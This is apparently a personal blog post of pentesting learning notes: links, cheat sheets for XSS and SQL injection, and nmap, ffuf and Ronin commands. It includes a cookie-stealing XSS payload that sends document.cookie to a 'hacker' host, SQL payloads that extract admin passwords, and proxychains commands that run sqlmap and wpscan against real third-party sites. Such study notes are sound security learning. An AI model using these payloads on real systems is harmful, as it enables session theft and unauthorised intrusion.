---
layout: post
title:  "Learning notes PenTesting/Ethical Hacking"
date:   2020-12-15
categories: code software learning hacking programming hackerone
video: false
---

- [PayloadsAllTheThings](//github.com/swisskyrepo/PayloadsAllTheThings) and [here](//www.xss-payloads.com/payloads-list.html?a#category=all)
- [Resources](//www.hacker101.com/resources)
- [Public firing range](//public-firing-range.appspot.com/) [Github](//github.com/google/firing-range)
- [XSS Hunter](//xsshunter.com/features)
- [Dom Wiki](//github.com/wisec/domxsswiki/wiki/Finding-DOMXSS)
- [Github](//github.com/s0wr0b1ndef/Hacker101) includes Coursework
- [Portswigger WebAcademy](//portswigger.net/web-security)
- [Ronin - ruby plattform for scanning/exploits](//ronin-rb.dev/examples/)
- [Fuzz Faster Fool](https://github.com/ffuf/ffuf)
- [tcpcrypt](//github.com/scslab/tcpcrypt)
- [m0llock](https://github.com/m4ll0k/Bug-Bounty-Toolz) Bug-Bounty-Toolz | WAScanner
- [venom](//github.com/venom26) 

- [Awesome bug WriteUps](//github.com/m4ll0k/Awesome-Bugbounty-Writeups)

#### Quick Ref
- [SSRF](//github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
- [SQL entry point detection](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)
- [SQL WAF ByPass](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#waf-bypass)
- [SQL Authentication ByPass ](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
- [CORS Misconfiguration](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- [WebSocket Attacks](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets)
- [SecList](//seclists.org/) - [Github](https://github.com/jhaddix/SecLists)
- [Cool Bash](//github.com/venom26/recon/blob/master/bash_profile)

#### Server Hosting
- Apache2
  - UsefulCommands:
  `tail -f /usr/local/var/log/httpd/error_log
   tail -f /usr/local/var/log/httpd/access_log
   tail -f /usr/local/var/log/httpd/access_log
   open /usr/local/etc/httpd/httpd.conf
   tail-f /usr/local/var/log/httpd/ssl_request_log`
- Puma/[Puma Dev](//github.com/puma/puma-dev) A fast, zero-config development server for macOS and Linux (Like Apache)

#### Introduction
  - Be able to use Java
  - Request [package](//pypi.org/project/requests/) for Python
  - Burp Proxy(Installed community edition) and Firefox
  - Burp proxy uses embedded browser, and added Firefox proxy.  Install CA certificate.

#### The Web In Depth
  - And how they impact security | [link](//www.hacker101.com/sessions/web_in_depth)
  - Cookies, key value pairs of data
  - Sending to wrong host or changing cookie data is a threat
  - Cookies, set between parent and child, not between siblings.
  - Can tag cookies either Secure(HTTPS) or HTTPOnly
  - Uses Set-Cookie header, can use `document.cookie`
  - Cookie security, cross domain and scope, good link [here](//stackoverflow.com/questions/5677846/what-should-i-know-about-cookies-domain-and-scope-for-security-purposes)

  - HTML parsing
    - How browsers and Web-Applications parse is different, creating vuln
    - Legacy parsing exploits tricks used to clean up after bad html e.g. putting {} around script tags got passed web-app firewalls but executed browser.

  - MIME Sniffing
    - If you can control how browser decodes, you may be able to alter parsing
    - Good example is putting UTF-7 with base64'd blocks to get around web-app firewalls
    - Doesn't have {} which are obvious filtered out unsafe elements
    - Safe security, !set encoding client and server side, and MIME types!.

  - Same origin policy (SOP)
    - Can change `document.domain` then change sub-domain you can communicate with
    - Anyone can call postMessage in an iFrame:

      - `document.getElementById('cross_domain_page').contentWindow.postMessage(.......)`
  	  - `postMessage function(message, targetOrigin)`
    - SOP protocol must no cross HTTP/HTTPs, and domain names must exact match, no wildcards.
  
  - Cross-site Forgery Request(CSURF)
    - Uses CSRF tokens and tie to uses session, embed in forms
    - When POST used CRSF to check state can change
    - !Use basic automatic scanners to see vuln GET changing state to attack!!
    - Prevention [cheatSheet](//cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

#### XSS (cross scripting) and Authorization
  - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#bypass-using-utf---8)
  - Reflected and Stored XSS
    - Example reflected XSS bounty [report](//hackerone.com/reports/766633)
    - [Like-A-Pro](//www.hackerinside.me/2019/12/xss-like-pro.html), good techniques on manual hacking a website.

  - DOM XSS
    - The most common source is the URL, which is typically accessed with the location object.
    - Vulernable to XSS scripting?
    - Embedded tag or string | Any special handling? | URLs into links?
    - Special character handling? `'<>:;"`
  
    - Exploit Case 1
      - Simple script tag:  `<script>alert(1);</script>`
      - If have WAF or filters, embed an anchor tab or img with a bad source or onError.
    - Exploit Case 2
      - Double quotes passed through, scrubbed {} brackets, use DOM events e.g. mouseover, excript executes on event.
    - Exploit Case 3
      - HTML encoding e.g. `; alert(1);`
      - String escape e.g. `</script><script>alert(1);</script>`
    - DOM XSS
      - Does not hit server side, hard to mitigate
      - Good explanation [here](//www.netsparker.com/blog/web-security/dom-based-cross-site-scripting-vulnerability/)

  - How to change sessionID and CRSF?
     - Bypass filters, use onError to insert `<script>` via image
     - HTML parsing in strings and quotes
     - eval/SetTimeOut
     - DOM XSS - dont put user-controlled data directly into page, hard to mitigate
     - Forced Browsing ( perform every action using highest priviledged user, swapping IDs/CSRF, or tokens )

  - Cheat Sheet XSS:
     - Good [Sources and sinks](//portswigger.net/web-security/dom-based)
     - `><h1>test</h1>` | ` "\"><img src=/ onerror=alert(1)>" ` | `'+alert(1)+'`
     - `http://"onmouseover"=alert(1)` | `onmouseover="alert(1)"` | `+ADw-script+AD4-alert(1);+ADw-/script+AD4-`
     - `"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>`
     
     - One obvious way to craft an XSS exploit is to terminate the double quotation marks that enclose the attribute value
       - `"><script>alert(document.domain)` 
   
     - Polygot XSS locator: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
     - Malformed A Tags:  `\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>`
     - Bypass most SRC domain filters:  `<IMG SRC=# onmouseover="alert('xxs')">`
         - [1] XSS evasion cheatsheet

   - CourseworkCTF:
    - Look at image source to get FLAG
    - Add quote to end of url, injectable
    - Page content controllable, can insert script via special character to DB then render
    - Forbidden view page, change address bar to edit and get flag

#### Javascript for hackers 
  - Using Chrome dev tools for static analysis of JS
  - List of know vulnerabilities in [Public firing range] e.g. postMessage `eval`
  - Cool POC tool with example [//repl.it/@MarkElliott/postMessage-Eval-POC#index.html]
  - Finding API endpoints in JS (keywords such as v1, api etc )
  - Look at wayBackMachine to find/track changes in code/javascript, look at first applications in WBM, as most rushed and least protected, then reverse engineer.

  - Popular Sources and sinks
    - eval | setTimout | setInterval
    - document.URL | document.documentURI | document.referrer | document.write
    - location.href | location.search | location.*
    - window.name
    - (element).innerHTML
    - document.baserURI `http://www.example.com/test.html#<script>alert(1)</script>`

#### SQL Injection
  - Cloned github sqlmap, opensource SQL pentesting tool for SQL injection flaws
  - Examples and overview in portswigger [here](//portswigger.net/web-security/sql-injection)
  - username ` administrator'-- ` subverts application logic
  - using ` admin' ` shows if can SQL inject, then determine columns
    - ` https://insecure-website.com/products?category=Gifts'-- `
    - ` https://insecure-website.com/products?category=Gifts'+OR+1=1-- `
  
  - SQL Union select attacks
    - ` 'UNION SELECT '123' AS password FROM admins WHERE '1' = '1 `
    - ` foo' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.username as char),0x27,0x7e) FROM `level2`.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1 `
    - ` foo' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.password as char),0x27,0x7e) FROM `level2`.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1 `

#### Command Injection and SQLi
  - [PayloadsAndAllTheThings](//github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
    
  - Good [hackerOne tutorial](//www.hackerone.com/blog/how-to-command-injections)
  - Exploit ping and hostname using `ping 0.0.0.0 && echo`
  - Paylods:
    - ` 'or 1='1-- ` (all rows - true )
    - ` 'AND 0='1-- `(no rows - false )
  - Example header injection [report](//hackerone.com/reports/297478)
  - Example header injection [report](//hackerone.com/reports/761304)

#### NMAP Cheat Sheet
  - `
    nmap 127.0.0.1
    nmap 127.0.0.1 -sS
    nmap 127.0.0.1 -sS
    sudo nmap 127.0.0.1 -sS
    nmap 127.0.0.1 -sU
    sudo nmap 127.0.0.1 -sU
    sudo nmap 127.0.0.1 -sA
    nmap 127.0.0.1 --top-ports 2000
    sudo nmap 127.0.0.1 -O
    nmap --script whois* something.com
    `

#### [FFUF](//github.com/ffuf/ffuf)
  Good video: //codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html
  - uses wordlist to find assets via scan
  - `ffuf -u xx.com/FUZZ -w ./wordlist.txt | tee ./output.txt`
  - `ffuf -u xx.com/FUZZ -w ./wordlist.txt -recursion`
  - `ffuf -u xx.com/FUZZ -w ./wordlist.txt -recursion -e .doc`
  - `ffuf -u xx.com/FUZZ -w ./wordlist.txt -of html -o ./output.txt`
  - add cookies `-b "COOKIE1=VALUE1; VAL2=VAL2"`
  - custom headers `-H "HEADER1=VALUE1; HEAD2=VAL2"`
  - Multiple domains same wordlist `ffuf -u https://w2.com/W1 -w ./wordlist:W1 -w ./domains:W2`
  - Export request from burp then use in ffuf:  `ffuf -request /path/to/file -w ./wordlist`

#### Native Code Crash Course
  - Website [link](//www.hacker101.com/sessions/native_code_crash_course)

  - Registers | Memory | Physical | Virtual 
  - Page tables | Stack | Endianness | Instructions 
  - Program Counter | Calls | Syscalls | Shared Libraries
  
  - Bugs | Protections | Bypassing protections
  - Tools:
    - Debuggers | Disassemblers | Decompilers
    - Hex editors | Assemblers

#### Ronin [Examples](https://ronin-rb.dev/examples/)
  - Example [RoninExploits](//github.com/ronin-rb/ronin-exploits#readme) gem
  - `http_get_headers :url => 'http://example.com/'`
  - `"hello\x00\x90\a\b\t\r\n".hexdump`
  - udp_open?('4.2.2.1',53)
  - tcp_open?('example.com',80)
  - ronin net:proxy --port 53 --server 4.2.2.1 --udp --hexdump
  - ronin net:proxy --port 8080 --server google.com:80
  - ronin fuzzer -i request.txt -o bad.txt -r unix_path:bad_strings
  - Incrementally fuzz a string 
    - `"[1,2,3]".fuzz(/\d+/ => String.generate(['9', 1..100])) do |str|
        puts str
      end`
  - unix_connect('/tmp/haproxy.stats.socket')
  - Creating a UDP session which will be automatically closed 
    - `udp_server_loop(1337) do |server,(host,port),mesg|
      print_info "#{host}:#{port}"
      mesg.hexdump
     end`
  - `tcp_send(buffer,'example.com',1212)`
  - `ftp_connect('www.example.com', :user => 'joe', :password => 'secret')`
  - Unpack a string: `"\x00\x05hello\x00".unpack(:uint16_be, :string)`
  - Pack an Array: [0x05, "hello"].pack(:uint16_be, :string)
  - `tcp_banner('www.example.com',22)`
  - Return the SHA512 checksum of a String: `"thunder growl".sha512`

#### RFI to LFI
  - Good write up [here](//hassankhanyusufzai.com/RFI_LFI_writeup/)
#### Other Tools
  - XSS sink and source scan [XSS](//domxssscanner.geeksta.net/)
  - Vulnerability scanning [WhatWeb](//www.morningstarsecurity.com/research/whatweb)
  - ProxyChains on Kali Linux, `nmap` to ping and tcp connect `-Pn` `-ST`
    - proxychain `nmap -sT -p 80,443 <ipaddy>`
    - `cd /usr/local/Cellar/proxychains-ng/4.14/bin`
    - `./proxychains4 -f src/proxychains.conf telnet google.com 80`
    - `proxychains4 sqlmap -u https://softocracy.ru/prog.php?id=652 2>/dev/null`
    -  `proxychains4 wpscan -u https://hackware.ru -e p,vt,u 2>/dev/null`
  - [Ghidra] is a software reverse engineering (SRE) framework
  - [Radar2] a free/libre toolchain for easing several low level tasks like forensics, software reverse engineering, exploiting, debugging
  - [Public firing range] is a test bed for automated web application security scanners.
  - Cool expert CTF writeups [here](https://github.com/TFNS/writeups)

#### Good Case writeups
 - [XSS WAF & Character limitation bypass](//medium.com/bugbountywriteup/xss-waf-character-limitation-bypass-like-a-boss-2c788647c229)
 - [Traversing the path](//hawkinsecurity.com/2018/08/27/traversing-the-path-to-rce/)
 - [NAT Slipstream](//github.com/samyk/slipstream)
 - [Hacked top level domain](//labs.detectify.com/2021/01/15/how-i-hijacked-the-top-level-domain-of-a-sovereign-state/)
 - [Gr8 SQL injection server and client side](//secret.club/2020/04/15/flyff-sql-injection.html)

#### Misc Notes
  StoK 5 attack strategy:
  - subdomains | fingerprinting | portscanning  
  - visual analysis
  - brute force


#### Wordlists
  - https://github.com/venom26/ReconPi/tree/master/wordlists
  - https://github.com/danielmiessler/SecLists/tree/master/Fuzzing

fuzzing stuff - how to?
changinh response in burp to web-app
finding waf bypass dom xss

[1]: //owasp.org/www-community/xss-filter-evasion-cheatsheet
[Ghidra]: //github.com/NationalSecurityAgency/ghidra
[Radar2]: //rada.re/n/radare2.html
[Public firing range]: //public-firing-range.appspot.com/

